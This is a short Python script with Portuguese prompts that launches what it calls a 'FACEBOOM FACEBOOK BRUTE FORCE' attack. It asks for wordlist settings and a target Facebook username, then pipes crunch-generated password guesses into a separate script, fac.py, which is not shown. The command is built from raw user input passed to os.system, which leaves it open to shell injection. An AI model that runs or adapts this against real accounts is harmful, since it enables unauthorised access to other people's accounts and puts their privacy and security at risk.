import os
from time import sleep

def main():
    while True:
        os.system('clear')
        print('*' * 20 + '\r\nCONFIGURANDO CRUNCH\r\n'+'*'*20)
        min = input('MIN:')
        max = input('MAX: ')
        opt = input('OPTIONS: ')
        os.system('clear')
        print('*'*20+'\r\nCONFIGURANDO FACEBOOM FACEBOOK BRUTE FORCE'+'\r\n'+'*'*20)
        user = input('USERNAME FACEBOOK: ')
        if(min.isnumeric() == True and max.isnumeric() == True and opt != '' and user != ''):
            os.system('clear')
            print('EXECUTANDO CRUNCH')
            sleep(1)
            print('3...')
            sleep(1)
            print('2...')
            sleep(1)
            print('1...')
            sleep(1)
            os.system('crunch '+min+' '+max+' '+opt+' | python3.7 fac.py '+user)
try:
    main()
except KeyboardInterrupt:
    os.system('clear')
    quit(1)